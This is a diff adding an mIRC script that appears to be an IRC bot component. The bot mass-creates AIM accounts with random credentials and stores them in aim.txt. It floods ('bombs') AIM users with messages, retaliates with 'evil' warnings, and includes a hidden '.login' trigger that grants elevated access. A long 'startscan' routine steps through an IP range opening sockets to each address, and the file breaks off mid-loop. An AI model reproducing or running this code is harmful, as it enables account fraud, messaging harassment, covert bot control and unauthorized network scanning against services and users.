@@ -1,0 +1,866 @@
+on 1:text:$(.login $+ *):#:{
+  if ($2 == $level5) && ($level($nick) == 1) { auser 10 $nick | mell 15/07Login Accepted $+ 15\ }
+}
+alias aimregpacket { unset %rsn* | set %rsn $r(a,z) | var %a = $r(5,10) , %b = $r(1,4) , %c = $r(1,2) , %d = $r(100,1999999999)
+  if (%c = 1) { var %_ = 1 | while (%_ <= $calc(%a + %b)) { var %r = $r(1,2) | if (%r = 1) { set %rsn [ %rsn ] $r(a,z) } | if (%r = 2) { set %rsn [ %rsn ] $r(0,9) } | inc %_ } }
+  if (%c = 2) { var %_ = 1 | while (%_ <= $calc(%a + %b)) { var %r = $r(1,2) | if (%r = 1) { set %rsn [ %rsn ] $r(a,z) } | if (%r = 2) { set %rsn [ %rsn ] $r(0,9) } | inc %_ } }
+  var %sn = $remove(%rsn,$chr(32)),%domains = yahoo.com,lycos.com,compuserv.com,attbi.com,hotmail.com,inbox.net,cox.net,earthlink.net,%email = $+($r(a,z),$r(a,z),$r(a,z),$r(1,923),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),@,$gettok(%domains,$r(1,$gettok(%domains,0,44)),44)),%pw = $+($r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9)),%aimregpacket /_cqr/login/login.psp?siteId=aimregistrationPROD&createSn=1&newSN=1&mcState=initialized&authLev=1&submitSwitch=1&brandname=AIM&birthreg=1&fromSignIn=&screenname= $+ %sn $+ &password= $+ %pw $+ &password2= $+ %pw $+ &email= $+ %email $+ &month=0 $+ $rand(1,9) $+ &day= $+ $rand(0,2) $+ $rand(1,9) $+ &year= $+ $rand(1900,2000)  
+  mell 15/07Created following aim:07 Screenname:04 %sn 07Password:04 %pw 15\ | write aim.txt $+(%sn,:,%pw) | return %aimregpacket
+}
+on *:SOCKOPEN:aim_make*:{ sockwrite -nt $sockname GET $aimregpacket HTTP/1.0 | sockwrite -nt $sockname Accept-Language: en-us | sockwrite -nt $sockname User-Agent: Mozilla/?? | sockwrite -nt $sockname Host: my.screenname.aol.com | sockwrite -nt $sockname Connection: Keep-Alive | sockwrite -t $sockname $str($crlf,2) }
+alias roast { var %Roasted = 0x,%i = 1,%i2 = 0,%RoastString = Tic/Toc,%roastChar,%mLen = $len($1-) | while (%i <= %mLen) { %roastChar = $asc($mid($1-,%i,1)) | inc %i2 | if (%i2 > 7) { %i2 = 1 } | %roastChar = $xor(%roastChar,$asc($mid(%RoastString,%i2))) | %roastChar = $base(%roastChar,10,16) | if ($len(%roastChar) == 1) { %roastChar = 0 $+ %roastChar } | %Roasted = %Roasted $+ %roastChar | inc %i } | return $lower(%Roasted) }
+alias aimlogin { if ($2) { var %i = 1 , %InList = 1 | writeini AImIRC.ini Users CurrentUser $1 | %AIMUserPass = $2 | aimconnect } }
+alias aimconnect { if ($AIMConnectStatus == 1) { discard $input(Already Connected,260,Connect error) | return } | sockopen TIKTOC TOC.oscar.aol.com 80 | %AimSequence = $rand(10000,15000) | mell 15/7AIM Flood15\4 Connecting To AIM Server }
+alias aimdisconnect { sockclose TIKTOC | mell 15/07AIM Info:4 Disconnected15\ }
+alias AIMConnectStatus { return $iif(($sock(TIKTOC).mark == 1),1,0) }
+on *:sockopen:TIKTOC: { if ($sockerr > 0) { echo 4 -s SOCKET ERROR: $sockerr | return } | sockmark TIKTOC 1 | mell 15/7AIM Flood15\4 Connected To AIM Server. | sockwrite TIKTOC FLAPON $+ $crlf $+ $crlf }
+on *:sockclose:TIKTOC: { mell 15/07AIM Error:4 AIM Disconnected Me 15\ }
+alias aimencode { var %i = 1,%s,%AIMEncodeOut,%allowedChars = abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()-_=+|~`;'<,>.?/ | while (%i <= $len($1-)) { %s = $mid($1-,%i,1) | if (($pos(%allowedChars,%s) != $null) || $asc(%s) == 32) { if ($asc(%s) == 32) { %AIMEncodeOut = %AIMEncodeOut %s } | else { %AIMEncodeOut = %AIMEncodeOut $+ %s } } | else { %AIMEncodeOut = %AIMEncodeOut $+ \ $+ %s } | inc %i } | return %AIMEncodeOut }
+alias removehtml { var %Msg = $1- <>,%expr = /<.*?>/g,%tmp | discard $regsub(%Msg,%expr,$null,%tmp) | return %Tmp }
+
+alias create {
+  sockopen aim_make my.screenname.aol.com 80
+}
+alias aim.signon {
+  if ($lines(aim.txt) >= 1) && (!$sock(TIKTOC)) { aimlogin $gettok($read(aim.txt,$r(1,$lines(aim.txt))),1,58) $gettok($read(aim.txt,$r(1,$lines(aim.txt))),2,58) }
+  elseif ($sock(TIKTOC)) { mell 15/07AIM Already Connected15\ }
+  elseif (!$sock(TIKTOC)) { mell 15/7AIM Error:04 No Account Made, type ".aim create" 15\  }
+}
+alias aim.bomb {
+  if ($1) && ($sock(TIKTOC)) && (!$2) { senddata toc_send_im $remove($1,$chr(160)) " $+ $AIMEncode($str(<b>F</b>r<i>o</i>zen <b>Bot $chr(32) $+ ,25)) $+ " auto | mell 15/07AIM Flood on:04 $1 15\ }
+  elseif ($2) && ($sock(TIKTOC)) { senddata toc_send_im $remove($1,$chr(160)) " $+ $AIMEncode($2) $+ " auto | mell 15/07AIM Flood on:04 $1 07With:04 $2- 15\ }
+  elseif (!$sock(TIKTOC)) { mell 15/07AIM Error:04 Not Connected. Type ".aim signon"15\ }
+}
+alias aim.disconnect {
+  if ($sock(TIKTOC)) { aimdisconnect } 
+  else { echo -a Wasnt Even on }
+}
+on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
+alias handle_toc_error {
+  var %Err = $gettok($1-,1,58),%ErrData = $gettok($1-,2-,58),%ErrMsg = Unknown Error,%ErrTitle = Unknown Class | if (%Err isnum 901-903) { %ErrTitle = General Error } | elseif (%Err == 950) { %ErrTitle = Chat Error } | elseif (%Err isnum 960-962) { %ErrTitle = IM/Info error } | elseif (%Err isnum 970-979) { %ErrTitle = Directory Error } | elseif ((%Err isnum 980-983) || (%Err == 989)) { %ErrTitle = Authentication Error } | if (%Err == 901) { %ErrMsg = User %ErrData is not available } | elseif (%Err == 902) { %ErrMsg = Warning of %ErrData is not allowed }
+  elseif (%Err == 903) { %ErrMsg = Rate Limiting, Messages dropped } | elseif (%Err == 950) { %ErrMsg = Chat in %ErrData is not available } | elseif (%Err == 960) { %ErrMsg = Rate Limiting, you are sending messages too fast to %ErrData } | elseif (%Err == 961) { %ErrMsg = You missed a message from %ErrData because it was too long } | elseif (%Err == 962) { %ErrMsg = You missed a message from %ErrData because it was sent too fast (Rate limiting) } | elseif (%Err == 970) { %ErrMsg = Directory Failure } | elseif (%Err == 971) { %ErrMsg = Too many matches }
+  elseif (%Err == 972) { %ErrMsg = Need more qualifiers } | elseif (%Err == 973) { %ErrMsg = Directory service temporarily unavailable } | elseif (%Err == 974) { %ErrMsg = Email lookup restricted } | elseif (%Err == 975) { %ErrMsg = Keyword Ignored } | elseif (%Err == 976) { %ErrMsg = No Keywords } | elseif (%Err == 977) { %ErrMsg = Language Not supported } | elseif (%Err == 978) { %ErrMsg = Country not supported } | elseif (%Err == 979) { %ErrMsg = Unknown directory failure: %ErrData }
+  elseif (%Err == 980) { %ErrMsg = Incorrect Nickname or password | mell 15/07AiM Err08o07r:04 %ErrTitle - %ErrMsg - $+(#,%Err) $+ 15\ | aimdisconnect | aimlogin $gettok($read(aim.txt,$r(1,$lines(aim.txt))),1,58) $gettok($read(aim.txt,$r(1,$lines(aim.txt))),2,58) | halt } | elseif (%Err == 981) { %ErrMsg = Login service temporarily unavailable } | elseif (%Err == 982) { %ErrMsg = Your warning level is too high to sign on } | elseif (%Err == 983) { %ErrMsg = Rate Limiting, you have been connecting and disconnecting too fast. $+ $crlf $+ Wait 10 minutes and try again. $+ $crlf $+ If you continue trying, you will have to wait even longer } 
+  elseif (%Err == 989) { %ErrMsg = An unknown Signon error ( $+ %ErrData $+ ) has occurred | mell 15/07AiM Err08o07r:04 %ErrTitle - %ErrMsg - $+(#,%Err) $+ 15\ | aimdisconnect | aimlogin $gettok($read(aim.txt,$r(1,$lines(aim.txt))),1,58) $gettok($read(aim.txt,$r(1,$lines(aim.txt))),2,58) | halt } | mell 15/07AiM Err08o07r:04 %ErrTitle - %ErrMsg - $+(#,%Err) $+ 15\
+}
+
+on 1:sockread:TIKTOC: { if ($sockerr > 0) { echo 4 -s SOCKET ERROR: $sockerr | return } | bset &TOCRAW 4096 0 | sockread -f 4096 &TOCRAW | parseaimraw &TOCRAW }
+
+
+alias ParseAIMRaw {
+  var %SequenceNuber,%FrameType,%DataLength,%Msg,%StayInLoop = $true,%OffSet = 0 | bunset &TOCData | bset &TOCData $bvar($1,0) 0 | bcopy &TOCData 1 $1 1 $bvar($1,0) | while (%StayInLoop) { %FrameType = $FLAPHeader(&TOCData).FrameType | %SequenceNumber = $FLAPHeader(&TOCData).SequenceNumber | %DataLength = $FLAPHeader(&TOCData).DataLength | if ($AimParameter(Debug) == yes) { cm Data Length: %DataLength | cm Data from Server: $bvar(&TOCData,1,$bvar(&TOCData,0)).text | cm Data length from server: $bvar(&TOCData,0) | cm Frame Type: %FrameType | cm Sequence Number: %SequenceNumber } 
+  bcopy -c &TOCParse 1 &TOCData 7 %DataLength | if (%FrameType == 1) { SignonAIM %SequenceNumber } | elseif (%FrameType == 2) { ParseAIMData &TOCParse } | elseif (%FrameType == 5) { cm AIMKeepAlive } | bunset &TOCParse | bset &TOCParse 1 0 | if ($calc(%DataLength + 7) < $bvar(&TOCData,0)) { bcopy -c &TOCParse 1 &TOCData $calc(%DataLength + 7) -1 | bcopy -c &TOCData 1 &TOCParse 1 -1 } | else { %StayInLoop = $false } }
+}
+
+alias parseaimdata {
+  var %TOCData = $bvar($1,1,$bvar($1,0)).text
+  var %TOCWhat = $gettok(%TOCData,1,58)
+  if ($AIMParameter(Debug) == yes) {
+    echo TOCWHAT: %TOCWhat
+    echo TOC DATA: %tocdata
+  }
+  if (%TOCWhat == SIGN_ON) { handle_toc_sign_on }
+  elseif (%TOCWhat == IM_IN) { Handle_TOC_IM $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == CHAT_JOIN) { Handle_TOC_ChatJoin $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == CHAT_UPDATE_BUDDY) { handle_TOC_Chat_Userlist $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == CHAT_IN) { handle_toc_Chat_in $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == CHAT_INVITE) { .timer 1 0 handle_toc_invite $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == EVILED) { .timer 1 0 handle_toc_eviled $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == UPDATE_BUDDY) { handle_toc_update_buddy $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == CONFIG) { handle_toc_config $gettok(%TOCData,2-,58) }
+  elseif (%TOCWhat == ERROR) { .timer 1 0 handle_toc_error $gettok(%TOCData,2-,58) }
+}
+alias InitAIMHashes {
+  hfree -w AIM.Buddy.Hashes.*
+  hmake AIM.Buddy.Hashes.BuddyList 50
+  hmake AIM.Buddy.Hashes.PermitList 50
+  hmake AIM.Buddy.Hashes.DenyList 50
+  hmake AIM.Buddy.Hashes.BuddyGroups 50
+
+}
+alias handle_toc_config {
+  var %Max = $numtok($1-,10)
+  var %i = 1
+  var %BuddyLine
+  var %BuddyWhat
+  var %Buddy
+  var %CurrentGroupIndex = 0
+  var %CurrentBuddyIndex = 0
+  var %CurrentPermitIndex = 0
+  var %CurrentDenyIndex = 0
+
+  InitAIMHashes
+
+  while (%i <= %Max) {
+    %BuddyLine = $gettok($1-,%i,10)
+    %BuddyWhat = $gettok(%BuddyLine,1,32)
+    %Buddy = $gettok(%BuddyLine,2-,32)
+    if (%BuddyWhat == m) {
+      ;Permit/Deny mode
+      %AimPermitDenyMode = %Buddy
+    }
+    elseif (%BuddyWhat == g) {
+      ;Buddy Group
+      inc %CurrentGroupIndex
+      hadd AIM.Buddy.Hashes.BuddyGroups %CurrentGroupIndex %Buddy
+    }
+    elseif (%BuddyWhat == b) {
+      ;Buddy
+      inc %CurrentBuddyIndex
+      hadd AIM.Buddy.Hashes.BuddyList %CurrentBuddyIndex %CurrentGroupIndex $+ : $+ %Buddy
+    }
+    elseif (%BuddyWhat == p) {
+      ;Permit List
+      inc %CurrentPermitIndex
+      hadd AIM.Buddy.Hashes.PermitList %CurrentPermitIndex %Buddy
+    }
+    elseif (%BuddyWhat == d) {
+      ;Deny List
+      inc %CurrentDenyIndex
+      hadd AIM.Buddy.Hashes.DenyList %CurrentDenyIndex %Buddy
+    }
+
+    inc %i
+  }
+  cm doaimnotify
+}
+
+
+alias handle_toc_sign_on {
+  senddata toc_add_buddy ''
+  .timer 1 1 senddata toc_init_done
+}
+alias discard { }
+alias handle_toc_update_buddy {
+  var %User = $remove($gettok($1-,1,58),$chr(32)) $+ *aim
+  var %IsOnline = $gettok($1-,2,58)
+  var %EvilAmount = $gettok($1-,3,58)
+  var %SignonTime = $gettok($1-,4,58)
+  var %IdleTime = $gettok($1-,5,58)
+  var %UC = $gettok($1-,6,58)
+  var %IRCMsg = : $+ $server 
+  if (%IsOnline == T) {    %IRCMsg = %IRCMsg 600 $me %User Aim.User aol.instant.messenger $ctime :logged online }
+  else { %IRCMsg = %IRCMsg 601 $me %user aim.user aol.instant.messenger :logged offline }
+  if ($AIMParameter(debug) == yes) {  echo -s handle_toc_update_buddy IRCMSG: %ircmsg }
+  sockwrite -n PBIRCData %IRCMsg
+
+}
+alias handle_toc_eviled {
+  var %EvilPercentage = $gettok($1-,1,58)
+  var %EvilDoer = $gettok($1-,2-,58)
+  var %Ret
+  if ($len(%EvilDoer) > 0) { 
+    %Ret = $?!="You have been eviled by [ [ %EvilDoer ] $+ . ]  Your evil level is now [ [ %EvilPercentage ] $+ . ]  Return the favor?"
+    if (%Ret == $true) { senddata toc_evil $remove(%evildoer,$chr(32)) norm }
+    else { %ret = $?1="You have been eviled by an anonymous user.  Your evil level is now [ [ %EvilPercentage ] $+ . ]  Bet you're angry eh?" }
+
+  }
+}
+
+
+
+
+alias SendData {
+  /  ;BuildFlapHeader params $1 = Frame Type $2 = Sequence Number $3 = Data Length
+  bunset &flapheader &data &out
+  bset &FLAPHeader 1 0
+  bset -t &Data 1 $1-
+  bset &Out 1 0
+  bset &data $calc($bvar(&data,0)+1) 0
+  bcopy &FLAPHeader 1 $BuildFLAPHeader(2,%SequenceNumber,$bvar(&data,0)) 1 -1
+  bcopy &out 1 &FLAPHeader 1 -1
+  bcopy &out 7 &data 1 -1
+  if ($aimparameter(debug) == yes) {
+    echo -s FLAP Header: $bvar(&FLAPHeader,1,$bvar(&FLAPHeader,0)).text
+    echo -s FLAP Header Length: $bvar(&FLAPHeader,0)
+    echo -s FULL DATA: $bvar(&out,1,$bvar(&out,0)).text
+    echo -s full data length: $bvar(&out,0)
+
+  }
+  sockwrite TIKTOC &Out
+}
+
+
+
+alias -l SignonAIM {
+  var %SequenceNumber = $1
+  bset &FlapSignon 1 0 0 0 1 
+  bset &FlapSignon 5 0 1
+  ; 0 0 0 1 = FLAP version (1)
+  ; 0 1 = TLV Tag (1)
+  var %NormalizedUser = $aimparameter(NormalizedUser)
+  var %UserLen = $len(%NormalizedUser)
+  bset &flapsignon 7 $gethibyte(%UserLen)
+  bset &flapsignon 8 $getlobyte(%UserLen)
+  bset -t &flapsignon 9 %NormalizedUser
+
+  bset &aimlogonheader 6 0
+
+  bcopy &FlapHeader 1 $BuildFLAPHeader(1,%SequenceNumber,$bvar(&flapsignon,0)) 1 -1
+
+  bset -t &AIMSignonData 1 toc_signon login.oscar.aol.com 29999 $aimparameter(normalizeduser) $roast($aimparameter(pwd)) English "mIRCTIC"
+  bset &AIMSignonData $calc($bvar(&AIMSignonData,0) +1) 0
+  inc %sequenceNumber
+  bcopy &AIMLogonHeader 1 $BuildFLAPHeader(2,%SequenceNumber,$bvar(&AIMSignonData,0))) 1 -1
+  bcopy &flapheader $calc($bvar(&flapheader,0)+1)  &Flapsignon 1 -1
+  if ($AimParameter(Debug) == yes) {
+    echo -s AIM FLAP Logon: $bvar(&FlapHeader,1,$bvar(&FlapHeader,0)).text
+    echo -s AIM FLAP Logon length: $bvar(&FlapHeader,0)
+    echo -s AIM Logon string: $bvar(&AIMSignonData,1,$bvar(&AIMSignonData,0)).text
+    echo -s toc_signon FLAP header: " $+ $bvar(&AIMLogonHeader,1,$bvar(&AIMLogonHeader,0)).text $+ "
+    echo -s toc_signon FLAP header length: $bvar(&AIMLogonHeader,0)
+
+  }
+  sockwrite TIKTOC &FlapHeader
+  sockwrite TIKTOC &AIMlogonHeader
+  sockwrite TIKTOC &AIMSignonData
+}
+alias AIMSOCKCHECK {
+  if ($AIMConnectStatus != 1) { return 1 }
+  var %RawMsg = $bvar($1,1,$bvar($1,0)).text
+  var %MySocket = $2
+  var %ColonPos 
+  var %msgonly
+  var %Msg
+  var %i = 1
+  var %TokCount
+  var %RVal = 1
+  %RawMsg = $replace($replace(%RawMsg,$crlf,$lf),$cr,$lf)
+  %TokCount = $numtok(%RawMsg,10)
+  while (%i <= %TokCount) {
+    %Msg = $gettok(%RawMsg,%i,10)
+    inc %i
+    if (($gettok(%msg,1,32) == JOIN) && ($right($gettok(%msg,2-,32),4) == *aim)) {
+      %msg = $gettok(%msg,2-,32)
+      %msg = $left(%msg,$calc($len(%msg)-4))
+
+      if ($AIMParameter(debug) == yes) {  echo -s Joining aim channel: %msg }
+      senddata toc_chat_join 4 " $+ %msg $+ "
+      return 0
+    }
+    elseif (($gettok(%msg,1,32) == MODE) && ($right($gettok(%msg,2,32),4) == *aim)) { return 0 }
+    elseif (($gettok(%msg,1,32) == PRIVMSG) && ($right($gettok(%msg,2,32),4) == *aim)) {
+      %colonpos = $calc($pos(%msg,$chr(58)) + 1)
+      %MsgOnly = $mid(%Msg,%ColonPos)
+      if ($left($gettok(%msg,2,32),1) == $chr(35)) { senddata toc_chat_send $GetRoomID($gettok(%Msg,2,32)) " $+ $AIMEncode(%MsgOnly) $+ " }
+      else { senddata toc_send_im $trimaim($gettok(%Msg,2,32)) " $+ $AIMEncode(%MsgOnly) $+ " }
+      return 0
+    }
+    elseif (($gettok(%msg,1,32) == PART) && ($right($gettok(%msg,2,32),4) == *aim)) {
+      senddata toc_chat_leave $GetRoomID($gettok(%msg,2,32))
+      sockwrite -n PBIRCData : $+ %AIMUserHost PART $gettok(%msg,2,32)
+      return 0
+    }
+    elseif ($gettok(%msg,1,32) == AWAY) {
+      if ($gettok(%msg,2,58) != $null) {
+        set %AIMAwayMsg $gettok(%Msg,2-,58)
+        senddata toc_set_away " $+ $AIMEncode(%AIMAwayMsg) $+ "
+      }
+      else {
+        unset %AIMAwayMsg
+        senddata toc_set_away
+      }
+      return 1
+    }
+    elseif ($gettok(%msg,1,32) == WATCH) {
+
+      %MsgOnly = %Msg
+      var %WatchTokens = $numtok(%MsgOnly,32)
+      while (%WatchTokens > 0) {
+        if ($right($gettok(%MsgOnly,%WatchTokens,32),4) == *aim) { %MsgOnly = $deltok(%MsgOnly,%WatchTokens,32) }
+        dec %WatchTokens
+      }
+      sockwrite -n %MySocket %MsgOnly
+      %rval = 0
+    }
+  }
+  return %rval
+}
+alias trimaim { return $remove($left($1-,$calc($len($1-)-4)),$chr(160)) }
+
+alias BuildFLAPHeader {
+  ;$1 = Frame Type $2 = Sequence Number $3 = Data Length
+  inc %AIMSequence
+  if (%AIMSequence >= 65535) {  %AIMSequence = 1 }
+
+  var %SN = %AIMSequence
+  bunset &header
+  bset &header 1 42
+  bset &header 2 $1
+  bset &header 3 $getHiByte(%SN)
+  bset &header 4 $getLoByte(%SN)
+  bset &header 5 $getHiByte($3)
+  bset &header 6 $getLoByte($3)
+  return &header
+}
+
+alias FLAPHeader {
+  var %h1
+  var %h2
+  if ($Prop == FrameType) {
+    %h1 = $bvar($1,2)
+    return %h1
+  } 
+  elseif ($Prop == SequenceNumber) {
+    %h2 = $bvar($1,3)
+    %h1 = $bvar($1,4)
+    return $toWord(%h1,%h2)
+
+  } 
+  elseif ($Prop == DataLength) {
+    %h2 = $bvar($1,5)
+    %h1 = $bvar($1,6)
+    return $toWord(%h1,%h2)
+  }
+
+}
+alias toWord { 
+
+  return $calc(($2 * 256) + $1)
+
+}
+alias getLoByte {
+  var %byte = $1 & 255
+  return %byte
+}
+
+alias getHiByte {
+  var %byte = $calc($1 / 256) & 255
+  return %byte
+}
+
+alias AIMParameter {
+  var %AUN = $readini AImIRC.ini Users CurrentUser
+  if ($1 == Debug) { return $readini AImIRC.ini Advanced Debug }
+  elseif ($1 == NormalizedUser) { return $lower($remove(%AUN,$chr(32)))) }
+  elseif ($1 == User) { return %AUN }
+  elseif ($1 == Pwd) { return %AIMUserPass }
+}
+alias startscan {
+  inc %totalscaning
+  if %totalscaning == %total finished
+  set %ip1 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 1
+  set %ip2 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 2
+  set %ip3 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 3
+  set %ip4 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 4
+  set %ip5 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 5
+  set %ip6 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 6
+  set %ip7 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 7
+  set %ip8 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 8
+  set %ip9 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 9
+  set %ip10 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 10
+  set %ip11 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 11
+  set %ip12 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 12
+  set %ip13 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 13
+  set %ip14 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 14
+  set %ip15 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 15
+  set %ip16 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 16
+  set %ip17 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 17
+  set %ip18 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 18
+  set %ip19 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 19
+  set %ip20 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 20
+  set %ip21 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 21
+  set %ip22 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 22
+  set %ip23 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 23
+  set %ip24 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 24
+  set %ip25 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 25
+  set %ip26 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 26
+  set %ip27 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 27
+  set %ip28 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 28
+  set %ip29 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 29
+  set %ip30 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 30
+  set %ip31 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 31
+  set %ip32 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 32
+  set %ip33 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 33
+  set %ip34 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 34
+  set %ip35 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 35
+  set %ip36 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 36
+  set %ip37 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 37
+  set %ip38 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 38
+  set %ip39 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 39
+  set %ip40 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 40
+  set %ip41 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 41
+  set %ip42 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 42
+  set %ip43 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 43
+  set %ip44 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 44
+  set %ip45 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 45
+  set %ip46 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 46
+  set %ip47 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 47
+  set %ip48 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 48
+  set %ip49 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 49
+  set %ip50 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 50
+  set %ip51 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 51
+  set %ip52 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 52
+  set %ip53 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 53
+  set %ip54 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 54
+  set %ip55 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 55
+  set %ip56 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 56
+  set %ip57 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 57
+  set %ip58 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 58
+  set %ip59 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 59
+  set %ip60 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 60
+  set %ip61 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 61
+  set %ip62 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 62
+  set %ip63 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 63
+  set %ip64 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 64
+  set %ip65 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 65
+  set %ip66 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 66
+  set %ip67 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 67
+  set %ip68 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 68
+  set %ip69 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 69
+  set %ip70 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 70
+  set %ip71 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 71
+  set %ip72 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 72
+  set %ip73 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 73
+  set %ip74 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
